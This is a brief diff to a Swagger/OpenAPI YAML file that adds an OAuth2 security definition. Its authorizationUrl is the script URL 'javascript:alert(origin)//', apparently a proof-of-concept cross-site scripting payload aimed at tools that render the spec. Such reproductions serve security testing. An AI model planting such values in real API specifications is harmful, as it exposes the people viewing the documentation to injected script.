@@ -13,3 +13,7 @@ paths:
       responses:
         200:
           description: Successful response
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: javascript:alert(origin)//
